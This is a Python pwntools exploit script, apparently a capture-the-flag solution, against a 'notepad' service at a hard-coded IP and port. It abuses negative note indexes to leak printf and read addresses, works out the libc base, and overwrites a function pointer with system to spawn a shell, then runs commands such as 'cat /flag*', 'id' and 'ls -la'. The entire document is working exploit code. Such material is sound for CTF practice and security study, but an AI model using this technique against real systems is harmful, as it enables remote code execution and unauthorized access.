#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

HOST = '39.96.193.120'
PORT = 10005

elf = ELF('./unpacked/notepad')
libc = ELF('./unpacked/libc.so.6')

def create_note(p, idx, title, content):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Name: ', title)
    p.sendafter(b'Content: ', content)

def view_note(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def exploit():
    p = remote(HOST, PORT)

    create_note(p, 0, b'sh\x00' + b'\x00' * 13, b'\x00' * 4)

    view_note(p, -4)

    p.recvuntil(b'Name: ')
    leak_printf_raw = p.recvline().strip()
    leak_printf = u64(leak_printf_raw.ljust(8, b'\x00'))
    log.success(f'Leaked printf: {hex(leak_printf)}')

    p.recvuntil(b'Content: ')
    leak_read_raw = p.recvline().strip()
    leak_read = u64(leak_read_raw.ljust(8, b'\x00'))
    log.success(f'Leaked read: {hex(leak_read)}')

    libc_base = leak_printf - libc.symbols['printf']
    system_addr = libc_base + libc.symbols['system']
    log.success(f'libc base: {hex(libc_base)}')
    log.success(f'system: {hex(system_addr)}')

    payload = b'\x00' * 16 + p64(system_addr) + b'\x00' * 8
    create_note(p, -5, b'\x00' * 16, payload)

    log.info('Triggering system("sh")...')
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', b'0')

    sleep(0.3)
    p.sendline(b'cat flag*')
    p.sendline(b'cat /flag*')
    p.sendline(b'id')
    p.sendline(b'ls -la')

    p.interactive()

if __name__ == '__main__':
    exploit()
